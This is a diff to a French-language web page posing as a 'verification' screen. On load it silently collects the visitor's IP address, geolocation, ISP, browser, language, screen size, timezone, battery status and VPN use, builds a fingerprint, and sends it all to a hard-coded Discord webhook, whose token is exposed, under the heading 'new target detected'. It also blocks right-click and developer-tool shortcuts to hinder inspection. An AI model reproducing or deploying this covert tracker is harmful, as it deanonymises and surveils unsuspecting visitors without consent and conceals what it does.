@@ -3,79 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>✅ Vérification...</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
-    </style>
+    <title>Vérification...</title>
     <script>
-        // Bien joué ! 😃 si tu as accès a ici tu es trop un hackeur 🥰, voyons voir ce que tu vas faire après avoir analysé ce code ! 
-        document.addEventListener("contextmenu", event => event.preventDefault());
-        document.addEventListener("keydown", function(event) {
-            if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
-                event.preventDefault();
+        document.addEventListener("contextmenu", e => e.preventDefault());
+        document.addEventListener("keydown", e => {
+            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+                e.preventDefault();
             }
         });
 
         async function getUserInfo() {
             try {
-                let ipData = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
-                let geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(res => res.json());
+                const ip = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
+                const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());
 
-                let ip = ipData.ip;
-                let os = navigator.userAgent;
-                let lang = navigator.language;
-                let screenSize = `${screen.width}x${screen.height}`;
-                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                let batteryStatus = "Inconnu";
-                let vpnDetection = geoData.org.includes("VPN") || geoData.org.includes("Proxy") ? "🚨 VPN/Proxy détecté !" : "✅ Connexion normale";
+                const now = new Date().toLocaleString();
+                const ua = navigator.userAgent;
+                const lang = navigator.language;
+                const screenSize = `${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
+                const batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
+                const vpn = geo.org.includes("VPN") || geo.org.includes("Proxy") ? "🚨 VPN / Proxy détecté" : "✅ Connexion normale";
+                const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}`);
 
-                if (navigator.getBattery) {
-                    let battery = await navigator.getBattery();
-                    batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
-                }
-
-                let message = `
-                    **🔍 Nouvelle connexion détectée :**
-                    - **🌍 IP:** ${ip}
-                    - **📌 Pays:** ${geoData.country_name} (${geoData.region}, ${geoData.city})
-                    - **📶 FAI:** ${geoData.org}
-                    - **💻 OS / Navigateur:** ${os}
-                    - **🌐 Langue:** ${lang}
-                    - **📱 Résolution écran:** ${screenSize}
-                    - **🕰️ Fuseau horaire:** ${timezone}
-                    - **🔋 Batterie:** ${batteryStatus}
-                    - **🛡️ Statut VPN:** ${vpnDetection}
+                const message = `
+**🎯 Nouvelle cible détectée**
+> 🕒 Date/Heure : \`${now}\`
+> 🌍 IP : \`${ip}\`
+> 🧬 Fingerprint : \`${fingerprint}\`
+> 📍 Localisation : \`${geo.city}, ${geo.region}, ${geo.country_name}\`
+> 🧠 Fournisseur : \`${geo.org}\`
+> 🖥️ OS/Navigateur : \`${ua}\`
+> 🗣️ Langue : \`${lang}\`
+> 🧭 Fuseau horaire : \`${timezone}\`
+> 📱 Résolution : \`${screenSize}\`
+> 🔋 Batterie : \`${batteryStatus}\`
+> 🛡️ VPN : ${vpn}
                 `;
 
-                sendToDiscord(message);
-            } catch (error) {
-                console.error("❌ Erreur lors de la récupération des données :", error);
+                await sendToDiscord(message);
+            } catch (err) {
+                console.error("Erreur pendant le tracking :", err);
             }
         }
 
-        function sendToDiscord(message) {
-            let webhookURL = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: message })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error("❌ Erreur Webhook :", response.statusText);
-                } else {
-                    console.log("✅ Message envoyé sur Discord !");
-                }
-            })
-            .catch(error => console.error("❌ Erreur lors de l'envoi du message :", error));
+        async function sendToDiscord(msg) {
+            const webhook = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";
+            try {
+                await fetch(webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: msg })
+                });
+            } catch (e) {
+                console.error("Erreur envoi webhook :", e);
+            }
         }
 
         window.onload = getUserInfo;
     </script>
 </head>
-<body>
-    <h1>✅ Vérification en cours...</h1>
-    <p>Merci de patienter quelques secondes...</p>
-</body>
+<body style="margin:0; background-color:#111;"></body>
 </html>
